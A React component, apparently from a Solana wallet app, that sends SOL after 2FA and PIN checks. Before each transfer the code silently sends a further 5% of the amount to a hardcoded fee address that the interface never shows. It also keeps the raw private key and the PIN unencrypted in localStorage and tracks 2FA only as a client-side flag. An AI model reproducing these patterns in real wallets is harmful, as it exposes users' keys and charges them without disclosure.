import React, { useState } from "react";
import { Input, Button, message, Spin, Tooltip } from "antd";
import axios from "axios";
import { Connection, PublicKey, SystemProgram, Transaction, Keypair, LAMPORTS_PER_SOL, sendAndConfirmTransaction, } from "@solana/web3.js";
import bs58 from "bs58";
import { CHAINS_CONFIG } from "../chains";
import TwoFactorAuth from "./TwoFactorAuth";
import sol from '../images/Solana_logo.png';
import calender from '../images/calender.svg'
import scan from '../images/scan.svg'
import ibutton from '../images/ibutton.svg'

function SendTab({ wallet, balance, selectedChain, getAccountTokens }) {
  const [sendToAddress, setSendToAddress] = useState("");
  const [amountToSend, setAmountToSend] = useState("");
  const [processing, setProcessing] = useState(false);
  const [hash, setHash] = useState(null);
  const [show2FA, setShow2FA] = useState(false);
  const [showPin, setShowPin] = useState(false);
  const [enteredPassword, setEnteredPassword] = useState("");
  const [flag, setFlag] = useState(false);
  const verifyPasswordAndSend = async () => {
    const storedPassword = JSON.parse(localStorage.getItem("pinSetup") || "{}")[wallet];
    if (enteredPassword === storedPassword && flag) {
      try {
        const toPublicKey = new PublicKey(sendToAddress);
        await sendTransaction(sendToAddress, amountToSend);
      } catch (e) {
        message.error("Invalid Solana Address Entered");
        resetForm()
      }
    } else {
      message.error("Incorrect password");
    }
  };

  const initiate2FA = () => {
    setShow2FA(true);
  };


  const handle2FAVerification = async (otp) => {
    const payload = { userId: wallet, token: otp };
    setProcessing(true);

    try {
      const res = await axios.post(`${process.env.REACT_APP_SERVER_URL}/verify-2fa`, payload);
      if (res.data.valid) {
        message.success("2FA verification successful, Now Enter Password");
        setFlag(true);
        setShowPin(true);
      } else {
        message.error("Invalid 2FA code. Please try again.");
      }
    } catch (error) {
      console.error("2FA verification failed:", error);
      message.error("Verification failed. Please try again.");
    } finally {
      setProcessing(false);
      setShow2FA(false);
    }
  };

  const sendTransaction = async (to, amount) => {
    const chain = CHAINS_CONFIG[selectedChain];
    const connection = new Connection(chain.rpcUrl, "confirmed");
    const secretKeyString = localStorage.getItem("privatekey");
    const secretKey = bs58.decode(secretKeyString);
    const fromWallet = Keypair.fromSecretKey(secretKey);
    const toPublicKey = new PublicKey(to);
    const feesPublicKey = new PublicKey('89HF8VxawNZks4D82HDGied3k3D3fQKWC55yCs6n5Mw1');

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: fromWallet.publicKey,
        toPubkey: toPublicKey,
        lamports: amount * LAMPORTS_PER_SOL,
      })
    );

    const transactionFees = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: fromWallet.publicKey,
        toPubkey: feesPublicKey,
        lamports: amount * 0.05 * LAMPORTS_PER_SOL,
      })
    );

    setProcessing(true);

    try {
      // Send fees transaction
      await sendAndConfirmTransaction(connection, transactionFees, [fromWallet]);
      console.log("Fees deducted");

      // Send main transaction
      const signature = await sendAndConfirmTransaction(connection, transaction, [fromWallet]);
      setHash(signature);
      console.log("Transaction signature:", signature);

      const transactionData = {
        amount: amountToSend,
        signature: signature,
        toAddress: sendToAddress,
        token: "SOL",
        type: "Sent",
        dateTime: getCurrentDateTime(),
      };

      const existingTransactions = JSON.parse(localStorage.getItem(wallet)) || [];
      existingTransactions.push(transactionData);
      localStorage.setItem(wallet, JSON.stringify(existingTransactions));

      message.success("Transaction Sent Successfully!");
      resetForm();
      getAccountTokens();
    } catch (err) {
      console.log("Transaction failed:", err);
      message.error("Transaction failed. Please try again.");
    } finally {
      setProcessing(false);
    }
  };

  const resetForm = () => {
    setAmountToSend("");
    setSendToAddress("");
    setEnteredPassword("");
    setShow2FA(false);
    setShowPin(false);
    setHash(null);
  };

  const getCurrentDateTime = () => {
    const now = new Date();
    return now.toISOString().replace('T', ' ').substr(0, 19);
  };

  return (
    <>
      <div className="w-full flex justify-center pb-5">
        <div className="py-1 px-2 flex item-center gap-1 rounded-[10px] border-[0.8px] border-[#1D1D1D]">
          <img src={sol} alt="Solana" className="w-[22px] h-[22px]" />
          <div className="text-center text-white text-[15px] font-normal font-urbanist leading-[21px]">Solana</div>
        </div>
      </div>
      <input className="text-center text-white text-[40px] font-bold font-urbanist leading-[18px] pb-[15px] border-none outline-none bg-transparent flex max-w-full placeholder:text-[20px]"
        placeholder="Enter Amount"
        value={amountToSend}
        onChange={(e) => setAmountToSend(e.target.value)}
      />
      {/* <div className="text-center text-[#474747] text-lg font-normal font-urbanist leading-[18px]"
      >$1,575 USD</div> */}


      <div className="pt-8">
        <div className="flex justify-between pb-2">
          <div className="text-[#a8a8a8] text-[13px] font-normal font-urbanist leading-[18px]">To</div>
          <div className="w-[48px] h-[17px] justify-start items-center gap-3 flex">
            <img src={calender} alt="Calender" />
            <img src={scan} alt="scan" />
          </div>
        </div>
        <Input
          value={sendToAddress}
          onChange={(e) => setSendToAddress(e.target.value)}
          placeholder="Enter Receiving Address"
          className="input h-12"
          style={{ backgroundColor: "black", color: "white" }}
        />
        <div className="w-full bg-[#0b0514] rounded-lg text-[#722ae8] text-[13px] font-medium font-urbanist leading-[15px] py-[15px] px-2.5 flex items-center gap-2 mt-2.5">
          <img src={ibutton} alt="ibutton" />
          <p className="text-start">Kindly ensure that the receiving address supports the Solana network</p>
        </div>
      </div>
      <div className="flex w-full justify-end mt-[15px] gap-1"> <p className="text-[#A8A8A8] text-start">Available Balance:</p> <p className="font-bold text-white">{balance}</p> </div>
      <Button
        className="frontPageButton1"
        style={{ width: "100%", marginTop: "20px", marginBottom: "20px" }}
        type="primary"
        onClick={() => {
          const setup = JSON.parse(localStorage.getItem("TwoFaSetupz"));
          const setupPin = JSON.parse(localStorage.getItem("pinSetup"));
          if (setup[wallet] && setupPin[wallet]) {
            if (parseFloat(amountToSend) <= balance) {
              initiate2FA();
            } else {
              message.error("Enter Amount less than or equal to current balance!");
            }
          } else {
            message.error("First setup 2FA and PIN both!");
          }
        }}
        disabled={processing || !sendToAddress}
      >
        Proceed
      </Button>
      {show2FA && (
        <TwoFactorAuth
          onVerify={handle2FAVerification}
          processing={processing}
        />
      )}
      {showPin && (
        <>
          <div className="sendRow">
            <p style={{ width: "90px", textAlign: "left", color: "white" }}> PIN:</p>
            <input
              type="password"
              className="input w-full h-7"
              value={enteredPassword}
              onChange={(e) => setEnteredPassword(e.target.value)}
              placeholder="Enter PIN"
              style={{ backgroundColor: "black", color: "white" }}
            />
          </div>
          <Button
            className="frontPageButton1"
            style={{ width: "100%", marginTop: "20px" }}
            type="primary"
            onClick={verifyPasswordAndSend}
            disabled={processing}
          >
            Send Tokens
          </Button>
        </>
      )}
      {processing && (
        <>
          <Spin />
          {hash && (
            <Tooltip title={hash}>
              <p>Hover For Tx Hash</p>
            </Tooltip>
          )}
        </>
      )}
    </>

  );
}

export default SendTab;